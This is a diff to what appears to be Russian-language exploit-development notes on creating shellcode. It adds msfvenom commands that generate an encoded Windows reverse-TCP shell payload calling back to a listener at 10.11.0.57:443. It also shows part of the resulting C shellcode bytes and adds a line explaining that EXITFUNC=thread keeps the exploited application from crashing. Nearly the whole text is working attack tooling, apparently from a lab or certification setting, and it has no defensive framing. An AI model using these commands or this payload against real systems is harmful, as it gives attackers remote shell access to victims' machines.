@@ -53,6 +53,7 @@ nasm >
 Создание shellcode:
 
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.57 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.57 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
 
 "\xba\xe3\x3f\xbb\x24\xd9\xce\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
 "\x52\x83\xc3\x04\x31\x53\x0e\x03\xb0\x31\x59\xd1\xca\xa6\x1f"
@@ -79,4 +80,5 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.57 LPORT=443 -f c -a x86 --p
 "\xb9\x68\x41\x7e\x3a\x98\x3a\x85\x22\xe9\x3f\xc1\xe4\x02\x32"
 "\x5a\x81\x24\xe1\x5b\x80";
 
-
+А что бы приложение не падало нужно сделать следующее:
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.57 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
